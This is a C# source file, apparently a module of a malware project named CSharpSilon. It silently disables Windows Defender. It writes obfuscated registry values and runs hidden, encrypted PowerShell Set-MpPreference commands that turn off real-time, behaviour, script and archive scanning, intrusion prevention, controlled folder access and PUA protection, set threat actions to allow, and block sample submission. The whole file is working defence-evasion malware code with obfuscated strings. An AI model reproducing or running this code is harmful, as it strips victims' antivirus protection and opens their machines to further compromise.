using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;

namespace CSharpSilon.Utils
{
    public class Defender
    {
        public static void Run()
        {
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                return;
            }
            RegistryEdit(Decrypt.Decode("BbSDrjfdC+4jJj5LRexAXduwIStyQLv3Du0GxJMhA/6tfrfaLKYLyVZy0PYxiPvWF5EY2YuJ5e6mRsfvJ5niR5UXRutwwCG/ajXx5Kmi6ZUFZYMowOH3yfz2BAdKOltGM7AM5feahkwUtImY8Tf1Fw=="), Decrypt.Decode("6cTpjd6Ly/JBntGk6Am03Ke5900OYCyla07jpezDZuDU7YW5f+mayqjREnM2JZOchS6Vfd86jBNGvDB8ex02/w=="), Decrypt.Decode("1Pj//0+uxFjVIC03BB0T82KCjoJbNtE1WXUBIFonE/g="));
            RegistryEdit(Decrypt.Decode("lb2ULBRvJmoUISYe0hujEjZy+uWN5yrDB0NfxMOjo6SsBh/L6Kdfwr3eWC1DUSIPsXFpJy4pf/hBrXitge9pVOH+oZGa/LzTDRXYC4CP68eSRoL4jCWu2GXldH1zUjsrbiOmVucQ6Yt7+Rg3oCB/qg=="), Decrypt.Decode("NQiz3zSrricHnRvcXoqJ+qUP/l54tZ8BfNtbWzKelvCp/qbaWuYHCnSJYOSApkfyOQcbXD8DEq9ZZ/dDxhLEwQ=="), Decrypt.Decode("gkkE1z6ECR6RtXtm6TsJDBbZC8RPhgeLj8Xt4ptguy8="));
            RegistryEdit(Decrypt.Decode("sReaZTQNdp7wK9ERY4TBoJ8olHvwYzjPGzsPbeJq/xnotNHbyV4oMOikgY5Ws3aJdNAT2kAwBYU8GqW4EjDfuyYVWX6v3GFhako0Gwh4ZixfMyYuE4gslsJmiKT07+iwu+Y+ztgkxvUsrSChQm1meEsLXKO7Zu3rlyQx5ilohWmAIMOYTClF9dUaB0YUOrvKtp9e/Gu3cdcS6N+J1oVdcw=="), Decrypt.Decode("xuuMFyErvfwWOqGhaH49oO3V9lRpsSFHmYaQIRFGDc4uq8iFiZ18lLp9o0JovVA7Rky2+hB6W6kgUScv3NtUWDKZPp9unYYGf5j7/O2gUXQ="), Decrypt.Decode("gkkE1z6ECR6RtXtm6TsJDBbZC8RPhgeLj8Xt4ptguy8="));
            RegistryEdit(Decrypt.Decode("nqxSpU+jJAPqvgR9gqABuzjmuFi2tH2QzaZxYaQwdRwCrin6qTkft77BSjlSr+O6Zqij0c06UE2MlQPOLkR3piVFliHuGXDMktFa0UsqHtvbf0FpXOY0x3qnWquxYVmX3kJrfPSimiQpALeKvFyTjG9P2aChkBa0CJehA/OcDMsfS86shE3a+Ekb+3lo4WeA3f+pOM2G3/J4QRxGe+7QGA=="), Decrypt.Decode("lC1n6/Jxz4nG2TsFGmeMrQzxJ5SfhFYLB0KuLeXhghV56qXsARISNkD1m4yOVC35ABMomAxp9iaG7brf1dmvGQomCVqejXX26zf4qxIsL6U="), Decrypt.Decode("MFUB1bRXGc+qa7yK2mOApXe2xN8Bpvjd3XtvZjpuT4w="));
            RegistryEdit(Decrypt.Decode("7bDlFLRv1XQVq5K24exMYfXZQrdcA/MGKkIdw0Hpp8pWwPtOjf9Kw5QQnxstosVguIwQPKqD0RRcKGku+Wtm2nJQolJ46Eth11OGzRhzyjbwvw/UxU8GhxEit5xanCBCXHDiqRRFjlCi5hMY+ThQIUoHoQe3O0fNHO4vlfXk8bWBcA8d8txcdfRG2PtwyULRV3t3HpKMPHwmiR43ANPACA=="), Decrypt.Decode("3ODPUxnlhdk+OjnzOVs1OeHiYlgpYCu39cE6wKE6F6KzBgqzPrWJGDcjppatQ0xvpPD1jv2xOmGjyvl1wzWLhke7qngmHZht/rB0t3T7nIU="), Decrypt.Decode("+9DU8Ollnw5hHDKu3/Yc9KTgWrMb3GUVtJQoWt/QmJg="));
            CheckDefender();
        }
        
        
        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (registryKey == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                    }
                    else if (registryKey.GetValue(name) != value)
                    {
                        registryKey.SetValue(name, value, RegistryValueKind.DWord);
                    }
                }
            }
            catch
            {
            }
        }
        
        private static void CheckDefender()
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					// Powershell
					FileName = Decrypt.Decode("nv1/ql74DClhltDqktXahE2FQnXbh/l1DCwxcoNaDkhduJ/rNzpBSS91Bh8Ot1Ak"),
					
					// Get-MpPreference -verbose
					Arguments = Decrypt.Decode("B1i1mjbUAkLeOd11OTcI6ugoP/wSNtb8jXJhX0m+IquScfI6QeB8i9wn8AVQHfEw1rqQXR500EMygnN+kfG+WnsBJ31rFK0Q6kgJPleeB/o="),
					UseShellExecute = false,
					RedirectStandardOutput = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					
					// Runas
					Verb = App.IsAdmin() ? Decrypt.Decode("n5plY2tsxHs9ps9dWXNLInpSiV5oESiCeWn4lWJw18Y=") : ""
				}
			};
			process.Start();
			while (!process.StandardOutput.EndOfStream)
			{
				string text = process.StandardOutput.ReadLine();
				
				// DisableRealtimeMonitoring
				// False
				if (text.Contains(Decrypt.Decode("+JnCmT4ODjkv5LtGMmrA+LNfyiVu7ZaaqgyTAjhBRDGbgaYBq5zH9n8Ew0akYIkStOrfoAs2zln1eioZy6kfaWDpXE/IWlDXfM6fzZPUZuQ=")) && text.Contains(Decrypt.Decode("4F6/Snq6N6/VTuyRzIIhSgMfamdlG5UtNvjtu+HWNxA=")))
				{
					// Set-MpPreference -DisableRealtimeMonitoring $true
					RunPS("pug0sVj/MCQJtAHELuUQpm5H9mxKN5oOlf3lLFPUgKaWmtskotlkg3Xt9OV3Rj/Dc+W9KNYGFxSz2AOv75CayQiVPd7MFHj+NVkzYi7w8oPu84DxI6WQCWsC9GdnrU6P177A/hYKx259o++jh2R+mf9BrpsgBSneahHd5IAjE2A=");
				}
				
				// DisableBehaviorMonitoring
				// False
				else if (text.Contains(Decrypt.Decode("fVggNFl38MGdmYunwxwvZdAp86cW+60fVRqbfM0egoCqr2iJBrIBPDLFUlJYVq5xH6sEY7lYQ8c4voir3ZuMOog7MGURDaHQUZH0b8ABn0k=")) && text.Contains(Decrypt.Decode("eScLxraHnd2vAyzuRJH2u0tST7LNKDD0EraOMJzH8vM=")))
				{
					// Set-MpPreference -DisableBehaviorMonitoring $true
					RunPS("ysCQLSa/Uwuqqqoy/7lbbjhuIGHJ8E7Tb7U+zmYKHCD8hgYmGPngYKKVJphGRANHaPVr7RUVV8EALF6PuOs3snze+OTUM2xRY7Na+NPEZ1LejNrBYmOMK2ebprUNNfemcIgRRsAhR16U7nsUG68aZ8LM8kI0t8vBvBgQDPNg0LY=");
				}
				
				// DisableBlockAtFirstSeen
				// False
				else if (text.Contains(Decrypt.Decode("ci/QF3IS747VWKrhHDkm3oy5m9VaEQF2Nfv+narcobkEmIGtneFF45BQRUXgZOGVUCLh8Duo5eSKhdhEwsgLWg==")) && text.Contains(Decrypt.Decode("kSEGq46hKBQpazOKuZ8V+9CEN/zXZJzTU4VLplFbsVk=")))
				{
					// Set-MpPreference -DisableBlockAtFirstSeen $true
					RunPS("yEh8W6Gd2MGOq8/fx6tTgWrUrRmpxmTwioOa8IJ8cQH+68D47yb3IzgE5SDVTgxfkC5RjSogX0PMP6GKS7/zvaQHlkXhPT6N/rU29CmXFZb8sI1KtMYt44rikcVt78WnKe3rgaQNFgSKgGECpzcuyw==");
				}
				
				// DisableIOAVProtection
				// False
				else if (text.Contains(Decrypt.Decode("eKFGBAM891YVGF9C3m1Sgls5UxI6zmC4ped4kuhe2AIOVOzPn7ZgvAkuy0U2THYzyy5SV/OgENhYfVPdnC/fog==")) && text.Contains(Decrypt.Decode("H460bZHd4TF1jGP27XuNUBqBD/pRZDYzgfRTf+hVczo=")))
				{
					// Set-MpPreference -DisableIOAVProtection $true
					RunPS("Sr2JioDBeuq5noKWwkbH9cYYsASeackmIF5nSER+3QV/BX811BzQIufZwxAMVcME+OI9gEMcGZ7a+czF07C+GRl/Qgfu8FkHpAuNg7PIoHpEnShV3ClTnfk5+PHbZFNT9hVdxHI4IOX+CISEhV8CKQ==");
				}
				
				// DisablePrivacyMode
				// False
				else if (text.Contains(Decrypt.Decode("0c5K6N7Ky/azimCI49yxb0QGpVILt+NksrU1vhuQGYL41tkb5rgeWL4GMJjXsw10RArq+/Ggo6SLyTn6IyYNxA==")) && text.Contains(Decrypt.Decode("6mizQCMRwaVX6OW/u4XNdAU+Fj8c4cgogK5hiL1N1mg=")))
				{
					// Set-MpPreference -DisablePrivacyMode $true
					RunPS("lGj32oB4KmUYAzJPai5hmQT+53luekMBed6IerAErXzsBkIemFWuZVTPvovjvVACN2qB5ao3NwU/mRD82D0ykqciBNpPwlSwc6IquuClEumtS/x2OH6o8NOlRbhMtJc+Ap/E2dMG3AsVpfbJaWORJQ==");
				}
				
				// SignatureDisableUpdateOnStartupWithoutEngine
				// False
				else if (text.Contains(Decrypt.Decode("SmPHx4rmaaj3UNMtAsT9LFqKwfCUdSRgZX7r4Zisw9NU6FWG46O8/ycborafRzB6BhVx3OWp7vuRvQKe4NRZHLC6wLRuVqXLocyZucX7xRX4zGrkmbNfm/SzGB+EHXHTMLc96exdgbn/LnL1Jx47tw==")) && text.Contains(Decrypt.Decode("3l+dYP+IPVw8n8KnjvftWi6Oa3SDZX4pvIRUkETRiiM=")))
				{
					// Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
					RunPS("We9OXld1sMUyuTBYZqkUpJWyo6fviIDiGOF2HiOq0HvnzAcCpnk5Fe/2UyMgZSZUo54lC4dTBRiXDdL/T8ki8q2IBRGzX3YPCIRt96i13LZHWhrVPertqRPeRq/m2jRwimpjPhwimiLKFEtFdAqezyBroECwwLtutUpe4ONFFw/Q/TPm3Wi18TErkR1WyOWgnqevNUfMcHh/309rM0B0JA==");
				}
				
				// DisableArchiveScanning
				// False
				else if (text.Contains(Decrypt.Decode("Qb1yRM5cBeXaYqVOr14kEKniF1phBug3CGXt0o74ZG4G+oR1Zx/AT1/7ghACHvNThtV/5MoY/Oi9mJIrrSztkA==")) && text.Contains(Decrypt.Decode("wXsgrtiyTDexzNNRJCqOJQTOVjjK23QwjDWsxTq6LdY=")))
				{
					// Set-MpPreference -DisableArchiveScanning $true
					RunPS("fA8ZT8YfkKRgaDOzwAZhu6p7Ux1EilFWoAiw0WCyTs4pu9kxutt7R+Xzhx/ted7Vblyt6xQRYXQIkT9fndVzZrAyt7RltiN6RJZhv3SiOJeAi7WUirU3w3wPvIRKPpf+N/3oofX0f3Y2TFARmydQaQ==");
				}
				
				// DisableIntrusionPreventionSystem
				// False
				else if (text.Contains(Decrypt.Decode("nWnWJzylf9vpBlCZ+Nw4axUG/KIfkzBAp9BFecXh/q/Ssx0/hWp9KO/F93Y3ME9aqDd/YjnjapOOC2wefItKS0SIjitSjeuyNPeIOm8pgz/dGhJUZ6jN8UYy7MAq3Raq")) && text.Contains(Decrypt.Decode("doeqIin88CQREJTDAqbTWlSMRjCQDVDDLhlOOa00KIU=")))
				{
					// Set-MpPreference -DisableIntrusionPreventionSystem $true
					RunPS("e7f3rwgUrf0wZuUiOEew3GTo4vLC2mwe28kKKLpp+CelJZpWJZNZpERMbvm5VrkkKanHccDEPYZIpvXpvSZ80KfZgEErpAUqtcL/tVKYy8UtNOSpTHb+a4LjorekYEXMaFbLhjnzDdBqiyYj0y1ef3lTOTRhIzi+ovfqQlK83uf/ivGQ9Mo+G4wuFYBhDRH/");
				}
				
				// DisableScriptScanning
				// False
				else if (text.Contains(Decrypt.Decode("Bb33hziMwUZfJT9d/UibXmUJ03pyHpPbIl9Q22bqe1AtGMzVWzvtuq+v9Two9YFzx2lu72PRpp6oi8KJbqb2bw==")) && text.Contains(Decrypt.Decode("DaJ8C8akPthV8w4BjtObvlrmQrR6VCGsN2hBMzvh07M=")))
				{
					// Set-MpPreference -DisableScriptScanning $true
					RunPS("LIvizP4WjkD+zXYM+ITxqbP4Nux/2r3K5dM9pIXZcYbWU1d36V28RPjkBpGwL2ji2CN5Un26I1U48I7pWRemN8gBHWKEGJQWB36BBrjwEQ1PcdEOL93vLqwGcuW3Llz4vskiZdAwwRbXgdvn98pnNw==");
				}
				
				// SubmitSamplesConsent
				// 2
				else if (text.Contains(Decrypt.Decode("k3RdL7QXCK/glNr+5Vu1Ec7EDaGpjD2vUuC3mKPDXLe2ydg45IUoim8Xm1MWEFDswabLVBn+qUt5iSEA4ZHeOw==")) && !text.Contains(Decrypt.Decode("jVbHGf4UDylrAUrrMo6V83vC6xeSo6ggFfIcf9XstjE=")))
				{
					// Set-MpPreference -SubmitSamplesConsent 2
					RunPS("6BjrDy2NONk3iKhCDQSsIqAAYSCJAQFsShlOU4xL5CzD3rdoZkKm3eDJFyuqzSVeTAfz8afAwEp9ygmOvGIqh+G2f8DnPL/z5hmU1+7cMhw6fKnIP7TdO1fBz9vyR0z5k5I2pK+fJvFjbuAXxrdJ/g==");
				}
				
				// MAPSReporting
				// 0
				else if (text.Contains(Decrypt.Decode("jtfQqf0yLs5vIowwrALQPurCkr/OMif2RkkhStqfOWDC/mcTYxRNzB1oGtcKs6T8")) && !text.Contains(Decrypt.Decode("muB/isVMFebmPRXHn2vBBF/q/hwdxSTzEwm8jDhK6fQ=")))
				{
					// Set-MpPreference -MAPSReporting 0
					RunPS("XsdFPni7TK730AJ6GpvUzfy0UARmfTTqm6DtVlqxPgWPe9m+ZRWj3+4m6mj74tMimLJQcdUK7xW1eut9Qy393kcopQhq4gRG/cyGbhXvltmZeuEa7Z4Fo/sA+5S02SQi");
				}
				
				// HighThreatDefaultAction
				// 6
				else if (text.Contains(Decrypt.Decode("LnvTVnMaTr4IwCMJ/hcQ6tM8YNylaFf8OZP7zThfmkpQ96wx0sCS68QXDfhFKjoCkpRnVl03HVT3ORz9zUxmfg==")) && !text.Contains(Decrypt.Decode("p3khf409KVIqhJ6Sq6QqUg/2EIInK78l4a3H5dw2lTE=")))
				{
					// Set-MpPreference -HighThreatDefaultAction 6 -Force
					RunPS("rL//6YVven91AgrFeb2UGRAVoMxa3yosFL3DsrhlBJd5/H60pWaZVh3s+huoi2jnunMzqnHPqlcwEfoXYZu1o2HdKyh80T8C38cVR6SFQTKq1n3XRn51j/5RUrcqOSKfvoJ1JQ6xdZd5M34ZoSZynJz7wiSCQIvl094IASUMVuA=");
				}
				
				// ModerateThreatDefaultAction
				// 6
				else if (text.Contains(Decrypt.Decode("jlAyfiFj4wOzbeBXX6CDcyAcuh2YzDx0/vs7ZUhJLSwKYNak6FDvqY0jiZPp+9V9z1c9Zc0IbiZ9dDG0OJIwTnz20Aap2ci57EOweOtyFnY=")) && !text.Contains(Decrypt.Decode("7qJgz0+mRxmhLetj2WCGrs78paZXmlC/6/BY7U7+a7Q=")))
				{
					// Set-MpPreference -ModerateThreatDefaultAction 6
					RunPS("EdcWU3Kj/lVwtR24nngMsFoI1pAWTdt9k9yVC8HmUgIa4lb5WOXbPTghJyQ02Dra3o+ySxZMe2bEjVBfrQ8te8VQWDM3h57f6ZvUCGM/lRMGcNZ6y2bzH1y+1kijdPGhMsuHbTa9sLXvs0omFnPZGA==");
				}
				
				// LowThreatDefaultAction
				// 6
				else if (text.Contains(Decrypt.Decode("oJNHjihdTvz3ToqHAdKUkOgrzUyznCSkAxgUOe22Eoa6F0RvKt76SabkuukENeUoF2G5W6nWQImSWB8XsfTuAQ==")) && !text.Contains(Decrypt.Decode("XuapaeXJ5wUBmxNVU5D46KuE7sb2uKXaB58O62/Qj0k=")))
				{
					// Set-MpPreference -LowThreatDefaultAction 6
					RunPS("Ygnhp7NWizZppL8TaLiW84vAObyFSA+scjtu5IpGAW8s+AlHiMG7wJNWIxtfDq1gihGlFW+D5bwu+uZT2PsHLZDHX2t+zgrHkU8vpgP+cUA4GrovoFsIeovuW2IeRLKOytGEpeAfQvr0rBUnA8rMfQ==");
				}
				
				// SevereThreatDefaultAction
				// 6
				else if (text.Contains(Decrypt.Decode("9mt6HsZvTpNhjB4DhTKhTL7f1GcKJr1NmlQW2N10s4K11xx2XljbrAC2TAiNVhhHuiGuFU9kM2AVxeQVGx8kJLSNSkKm+glQ606S7loGzQw=")) && !text.Contains(Decrypt.Decode("5SYKFaw+o3mFfxvhCYytI7QvnW0eTVX6SvqXoIwfL1M=")))
				{
					// Set-MpPreference -SevereThreatDefaultAction 6
					RunPS("lBNoh1agrGdxhG4+2tRwao8GfeyBDOoMaA4lprxeTyNqE0F1UgIw7na3+wThgHteykdFtrcZsI4dzWvmkXFljll+EqMghp1x29+iGKPono6EDst0m3r0rpU6oIs/J4xTXWYORBeEisgBkNb5ABb9Mw==");
				}
				
				// EnableControlledFolderAccess
				// 0
				else if (text.Contains(Decrypt.Decode("bIUS6Kx/bCDc88uUzshbeU2eojzmiVsTXRhNgI2Gnuv4GDWrDR/4QroEnjmUZ5WSNUT2yYRLNjMgo02w0Ufkb5lUy7mLiFkVJevUkgQD/VM=")) && !text.Contains(Decrypt.Decode("EPb+BFMhqpkpCWspXKsl0Rpsgz2f4RSXK6rdexbgjuE=")))
				{
					// Set-MpPreference -EnableControlledFolderAccess Disabled
					RunPS("Pmlt4A8m9oci9k3uWW//dnV/2O12NWOIKEambZdi+CU/ahKL1gPjW3TMRoODUbkFlZ1dukVRkF7oU0pNusbeLDEd/sH1Tc+P3nesuqQJ/G+9OQ9chuggNy2NQcJ0eZBe9FhrXTPihGPzhVu9UA0nXOOnOKd9JvOZwY0dwNFZj2U=");
				}
				
				// PUAProtection
				// 0
				else if (text.Contains(Decrypt.Decode("1+v/y25xbwZN4kGbYbWJCoz4YeFtwAmyZAfkWZ6ZaMOHwhsaDKTjZil5gSRkEupq")) && !text.Contains(Decrypt.Decode("J1GkANUPrEllScjecBq87JRw1eq4VTcrasQ3KHOgAvE=")))
				{
					// Set-MpPreference -PUAProtection disable
					RunPS("hoY4yI8KsukbYjF4eu5gU28Sw1Y8kScNiP7MyD5ihA1iuxFFaF48wILVaKWI+SRFN8vcMwXKJclwSYmCQjmPyjS8caPs/mjZCu/LBDINH1bBDQzG7PNu7VuXLxgFVB5R");
				}
				
				// ScanScheduleDay
				// 8
				else if (text.Contains(Decrypt.Decode("EsMHs0Xet6tWepSurJGXLrmriILdY1AkZevhQMa6UCTBp9R0/58lMwzxTEDaHunJ")) && !text.Contains(Decrypt.Decode("hC9ahByTV5tsEjKFPu2IAn6Bgpq3NZQZG050Gb5geCI=")))
				{
					// Set-MpPreference -ScanScheduleDay 8
					RunPS("vSMzrGIRKJZtYKr31svg/ZgcLrY8b8mSJiZuq4hpEbC4vM+2wNYPlNfdj/1HZUPoSIZPL8Ems6RSy/mmw0nJa2u8cl+BXMMfkkUhL4weC9vPAQ0V2QhebB6nk2Uffd4J");
				}
			}
			RunPS("8isfJ5H7HZCSKRT8Qs154CRcRkT1HeTjYkKQP6j/g48IVPSmOizTP0tAm3wRb3mivw3CYGF8cNsAOvnbAvaYZtDBI+o82XrY6DQT/JcEAz4ClrnjHNCgw5ASd3oMaVbYSOgLrU/YnFvJefmmxiMLNw==");
		}
        
		private static void RunPS(string args)
		{
			var arg = Decrypt.Decode(args);
			Process.Start(new ProcessStartInfo()
			{
				
				// Powershell
				FileName = Decrypt.Decode("QiEtKTNExIpOL27f+N5lh5dhO/MFLI2MiKt5dDD//EfcvUWf0/1QD+MSL/YrJgwg"),
				Arguments = arg,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				
				// runas
				Verb = App.IsAdmin() ? Decrypt.Decode("5JyfXoV4EfIU1vah6WD417KMThOPsUaEGjc6+Skl4+w=") : ""
			});
		}

    }
}